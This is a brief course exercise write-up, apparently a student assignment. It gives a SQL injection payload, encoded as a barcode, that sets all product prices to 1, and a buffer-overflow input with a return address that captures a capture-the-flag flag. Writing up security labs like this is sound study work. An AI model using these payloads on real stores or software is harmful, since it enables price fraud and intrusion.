# Øving 12

## SQL

`barcode -b "1; update products set price = 1"`

![barcode](https://barcode.tec-it.com/barcode.ashx?data=1%3B+update+products+set+price%3D1&code=&multiplebarcodes=false&translate-esc=false&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=&qunit=Mm&quiet=0)

## CTF

Looking at the assemebly and the decompiled code we can see that there is a buffer overflow vulnurability.

By sending 

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%ee%06%40%00%00%00%00%00
```

We get our flag.

For more detailed walkthrough see `CTF.md`
